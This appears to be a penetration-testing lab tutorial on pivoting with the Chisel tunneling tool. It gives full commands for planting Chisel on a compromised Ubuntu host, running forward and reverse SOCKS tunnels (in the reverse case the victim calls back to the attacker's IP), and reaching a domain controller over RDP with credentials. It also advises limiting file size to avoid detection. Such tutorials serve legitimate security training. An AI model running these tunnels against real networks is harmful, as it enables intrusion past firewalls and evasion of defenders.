# Chisel

Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.

{% hint style="info" %}
#### Download & Install

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
{% endhint %}

Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

{% hint style="warning" %}
#### Error Messages

If you are getting an error message with chisel on the target, try with a [different version](https://github.com/jpillora/chisel/releases).
{% endhint %}

***

## Setup

Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:

### Cloning Chisel

```bash
git clone https://github.com/jpillora/chisel.git
```

We will need the programming language `Go` installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use `go build` to build the Chisel binary.

{% hint style="info" %}
#### Note

Depending on the version of the `glibc` library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of `chisel`, which can be found in the `Releases` section of the GitHub repository.
{% endhint %}

### Building the Chisel Binary

Move into the chisel directory, then run:

```bash
go build
```

It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection.

Once the binary is built, we can use `SCP` to transfer it to the target pivot host.

***

## Basic Use

{% stepper %}
{% step %}
### Transferring Chisel Binary to Pivot Host

```bash
clue@attacker[~]$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09    
```
{% endstep %}

{% step %}
### Running the Chisel Server on the Pivot Host

```bash
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the `172.16.5.0/23` network, which will allow us to reach hosts on that network.

We can start a client on our attack host and connect to the Chisel server.
{% endstep %}

{% step %}
### Connecting to the Chisel Server

```bash
clue@attacker[~]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

In the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.

Now we can modify our `/etc/proxychains.conf` file and add `1080` port at the end so we can use [proxychains.md](proxychains.md "mention") to pivot using the created tunnel between the 1080 port and the SSH tunnel.
{% endstep %}

{% step %}
### Editing & Confirming proxychains.conf

We can use any text editor we would like to edit the `proxychains.conf` file, then confirm our configuration changes using `tail`.

```bash
clue@attacker[~]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```
{% endstep %}

{% step %}
### Pivoting to the DC

Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
{% endstep %}
{% endstepper %}

***

## Reverse Pivot

There may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

We'll start the server in our attack host with the option `--reverse`.

{% stepper %}
{% step %}
### Starting the Chisel Server on our Attack Host

```bash
clue@attacker[~]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`.
{% endstep %}

{% step %}
### Connecting the Chisel Client to our Attack Host

```bash
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.
{% endstep %}

{% step %}
### Editing & Confirming proxychains.conf

```bash
clue@attacker[~]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```bash
clue@attacker[~]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
{% endstep %}
{% endstepper %}
